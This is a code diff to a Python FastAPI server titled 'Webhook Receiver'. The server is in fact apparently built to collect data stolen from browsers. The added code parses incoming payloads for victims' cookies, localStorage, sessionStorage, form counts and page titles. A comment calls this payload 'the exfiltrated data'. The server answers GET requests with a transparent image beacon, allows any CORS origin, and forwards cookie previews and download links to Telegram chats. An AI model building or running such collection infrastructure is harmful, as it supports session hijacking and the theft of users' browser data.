@@ -1,5 +1,6 @@
 from contextlib import asynccontextmanager
 from datetime import datetime
+from typing import Any
 from uuid import uuid4
 import os
 import multiprocessing
@@ -12,6 +13,7 @@ from starlette.middleware.cors import CORSMiddleware
 from slowapi import Limiter
 from slowapi.util import get_remote_address
 from slowapi.middleware import SlowAPIMiddleware
+from slowapi.errors import RateLimitExceeded
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -21,14 +23,14 @@ PORT = int(os.getenv("PORT", 8443))
 RATE_LIMIT = os.getenv("RATE_LIMIT", "100/minute")
 MAX_BODY_SIZE = int(os.getenv("MAX_BODY_SIZE", 10_485_760))
 
-# 1x1 transparent PNG – returned for every GET request
+# 1x1 transparent PNG for image beacon fallback
 TRANSPARENT_PNG = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xdb\x00\x00\x00\x00IEND\xaeB`\x82'
 
 limiter = Limiter(key_func=get_remote_address)
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    # Startup: init bot and start polling in separate process
+    # Startup: init bot and start polling in process
     from .bot import init_bot
     app.state.bot_app = await init_bot()
     def run_polling():
@@ -38,12 +40,12 @@ async def lifespan(app: FastAPI):
     process = multiprocessing.Process(target=run_polling, daemon=True)
     process.start()
     yield
+    # Shutdown
     if process.is_alive():
         process.terminate()
 
-app = FastAPI(title="Ultimate Webhook Receiver", lifespan=lifespan)
+app = FastAPI(title="Webhook Receiver", lifespan=lifespan)
 
-# CORS – allow everything
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -56,73 +58,15 @@ app.add_middleware(SlowAPIMiddleware)
 app.state.limiter = limiter
 app.state.data_file = DATA_DIR / "data.json"
 
-# ----------------------------------------------------------------------
-# Background task to process GET data (so we return PNG instantly)
-# ----------------------------------------------------------------------
-async def process_get_data(token: str, site: str, data: str, request: Request):
-    try:
-        from .storage import verify_token, save_webhook_request, update_stats_and_recent, is_duplicate_request
-        token_data = await verify_token(token)
-        if not token_data:
-            print(f"Invalid token {token} for site {site}")
-            return
-        # site from token_data overrides passed site
-        site = token_data["site"]
-
-        req_id = str(uuid4())
-        ts = datetime.utcnow().isoformat()
-        client_ip = request.client.host
-        method = "GET"
-        full_url = str(request.url)
-        headers = dict(request.headers)
-        query_params = dict(request.query_params)
-        body = data.encode()
-
-        if len(body) > MAX_BODY_SIZE:
-            print(f"Payload too large for {req_id}")
-            return
-
-        # Duplicate check (optional)
-        is_duplicate = is_duplicate_request(headers, body)
-        if is_duplicate:
-            print(f"Duplicate request {req_id}, but processing anyway.")
-
-        save_webhook_request(req_id, ts, client_ip, method, full_url, headers, query_params, body)
-        update_stats_and_recent(req_id, ts)
-
-        # Notify Telegram (import here to avoid circular imports)
-        from .bot import send_to_bound_chats
-        preview_headers = str(headers)[:500] + '...' if len(str(headers)) > 500 else str(headers)
-        preview_body = body.decode(errors='ignore')[:500] + '...' if len(body) > 500 else body.decode(errors='ignore')
-        download_url = f"https://{request.url.hostname}:{PORT}/file/{req_id}"
-        msg = f"🆔 {req_id}\n📍 {client_ip}\n⏱️ {ts}\n📦 {method} {full_url}\n📋 Headers: {preview_headers}\n📄 Body: {preview_body}\n🔗 {download_url}"
-        await send_to_bound_chats(msg, site, req_id)
-        print(f"Processed GET for {req_id}")
-    except Exception as e:
-        print(f"Error in process_get_data: {e}")
-
-# ----------------------------------------------------------------------
-# Webhook endpoints
-# ----------------------------------------------------------------------
 @app.api_route("/webhook", methods=["GET","HEAD","POST","PUT","DELETE","CONNECT","TRACE","PATCH"])
 @limiter.limit(RATE_LIMIT)
 async def webhook_old(request: Request):
-    # For backward compatibility – return PNG even for bad requests
-    if request.method == "GET":
-        return Response(content=TRANSPARENT_PNG, media_type="image/png")
     raise HTTPException(403, "Access denied. Use /webhook/{token} with a valid token.")
 
 @app.api_route("/webhook/{token}", methods=["GET","HEAD","POST","PUT","DELETE","CONNECT","TRACE","PATCH"])
 @limiter.limit(RATE_LIMIT)
 async def webhook_endpoint(token: str, request: Request, background_tasks: BackgroundTasks):
-    # For GET requests, return PNG immediately and process data in background
-    if request.method == "GET":
-        data = request.query_params.get("data", "")
-        site = request.query_params.get("site", "unknown")
-        background_tasks.add_task(process_get_data, token, site, data, request)
-        return Response(content=TRANSPARENT_PNG, media_type="image/png")
-
-    # For non-GET, verify token and process normally (but still return PNG? optional)
+    # Verify token
     from .storage import verify_token
     token_data = await verify_token(token)
     if not token_data:
@@ -136,39 +80,59 @@ async def webhook_endpoint(token: str, request: Request, background_tasks: Backg
     full_url = str(request.url)
     headers = dict(request.headers)
     query_params = dict(request.query_params)
-    body = await request.body()
+
+    if request.method == "GET":
+        body = request.query_params.get("data", "").encode()
+    else:
+        body = await request.body()
     if len(body) > MAX_BODY_SIZE:
         raise HTTPException(413, "Payload too large")
 
-    from .storage import is_duplicate_request, save_webhook_request, update_stats_and_recent
-    is_duplicate = is_duplicate_request(headers, body)
-    if is_duplicate:
-        print(f"Duplicate request {req_id}, but processing anyway.")
+    # Parse and prepare combined body for saving
+    import json
+    try:
+        data = json.loads(body.decode('utf-8'))
+        summary = {
+            'cookies': data.get('cookies', 'none'),
+            'pageTitle': data.get('pageTitle', 'unknown'),
+            'forms': len(data.get('forms', [])),
+            'localStorage': f"{len(data.get('localStorage', {}))} items",
+            'sessionStorage': f"{len(data.get('sessionStorage', {}))} items"
+        }
+        body_combined = f"Original:\n{body.decode('utf-8')}\n\nFiltered:\n{json.dumps(summary, indent=2)}"
+        body_for_save = body_combined.encode('utf-8')
+    except:
+        body_for_save = body  # If not JSON, save as is
 
-    save_webhook_request(req_id, ts, client_ip, method, full_url, headers, query_params, body)
+# Check for duplicates (but don't skip processing)
+    from .storage import is_duplicate_request
+    is_duplicate = is_duplicate_request(headers, body_for_save)
+    if is_duplicate:
+        print(f"Duplicate request detected for {req_id}, but processing anyway.")
+
+    # Always save to file and update stats
+    from .storage import save_webhook_request, update_stats_and_recent
+    save_webhook_request(req_id, ts, client_ip, method, full_url, headers, query_params, body_for_save)
     update_stats_and_recent(req_id, ts)
 
-    from .bot import send_to_bound_chats
-    preview_headers = str(headers)[:500] + '...' if len(str(headers)) > 500 else str(headers)
-    preview_body = body.decode(errors='ignore')[:500] + '...' if len(body) > 500 else body.decode(errors='ignore')
-    download_url = f"https://{request.url.hostname}:{PORT}/file/{req_id}"
-    msg = f"🆔 {req_id}\n📍 {client_ip}\n⏱️ {ts}\n📦 {method} {full_url}\n📋 Headers: {preview_headers}\n📄 Body: {preview_body}\n🔗 {download_url}"
-    await send_to_bound_chats(msg, site, req_id)
+    # Always notify Telegram chats
+    await notify_telegram_chats(req_id, client_ip, ts, method, full_url, headers, body_for_save, site, request)
 
-    # For non-GET, return JSON (but PNG would also work – keep JSON for clarity)
-    status = "duplicate" if is_duplicate else "received"
-    return {"request_id": req_id, "status": status}
+    # Determine response based on method and duplicate status
+    if request.method == "GET":
+        return Response(content=TRANSPARENT_PNG, media_type="image/png")
+    else:
+        status = "duplicate" if is_duplicate else "received"
+        return {"request_id": req_id, "status": status}
 
-# ----------------------------------------------------------------------
-# Health and file download
-# ----------------------------------------------------------------------
 @app.get("/health")
 async def health():
     return {"status": "ok", "data_dir": str(DATA_DIR)}
 
 @app.get("/file/{req_id}")
-@limiter.limit("10/minute")
+@limiter.limit("10/minute")  # Rate limit downloads
 async def download_file(req_id: str, request: Request):
+    # Basic security: only allow if request has valid referer or something, but for now, rate limited
     from .storage import find_request_file
     file_path = await find_request_file(req_id)
     if not file_path or not file_path.exists():
@@ -179,6 +143,53 @@ async def download_file(req_id: str, request: Request):
         filename=f"webhook_{req_id}.txt",
         headers={"Content-Disposition": f"attachment; filename=webhook_{req_id}.txt"}
     )
+
+async def notify_telegram_chats(req_id: str, ip: str, ts: str, method: str, url: str, headers: dict, body: bytes, site: str = "default", request: Request = None):
+    try:
+        print(f"Notifying Telegram for request {req_id}")
+        from .bot import send_to_bound_chats
+        import json
+
+        # Try to parse the body as JSON (it should be the exfiltrated data)
+        summary = {}
+        try:
+            data = json.loads(body.decode('utf-8'))
+            # Extract key fields
+            summary['cookies'] = data.get('cookies', 'none')
+            summary['pageTitle'] = data.get('pageTitle', 'unknown')
+            summary['forms'] = len(data.get('forms', []))
+            ls_count = len(data.get('localStorage', {}))
+            ss_count = len(data.get('sessionStorage', {}))
+            summary['localStorage'] = f"{ls_count} items" if ls_count else "none"
+            summary['sessionStorage'] = f"{ss_count} items" if ss_count else "none"
+            # Optionally include first few cookies or other details
+        except:
+            summary = {'error': 'Body not JSON'}
+
+        # Build a concise message
+        msg = f"🆔 {req_id}\n📍 {ip}\n⏱️ {ts}\n📦 {method} {url.split('?')[0][:50]}...\n"
+        if 'cookies' in summary:
+            # Truncate cookies if too long
+            cookie_preview = summary['cookies'][:100] + '...' if len(summary['cookies']) > 100 else summary['cookies']
+            msg += f"🍪 Cookies: {cookie_preview}\n"
+        if 'pageTitle' in summary:
+            msg += f"📄 Page title: {summary['pageTitle']}\n"
+        if 'localStorage' in summary:
+            msg += f"📦 localStorage: {summary['localStorage']}\n"
+        if 'sessionStorage' in summary:
+            msg += f"🗃️ sessionStorage: {summary['sessionStorage']}\n"
+        if 'forms' in summary:
+            msg += f"📝 Forms: {summary['forms']}\n"
+        if 'error' in summary:
+            msg += f"⚠️ {summary['error']}\n"
+
+        download_url = f"https://{request.url.hostname}:{PORT}/file/{req_id}"
+        msg += f"🔗 {download_url}"
+
+        await send_to_bound_chats(msg, site, req_id)
+        print(f"Notification sent for {req_id}")
+    except Exception as e:
+        print(f"Error notifying Telegram for {req_id}: {e}")
 
 if __name__ == "__main__":
     import uvicorn
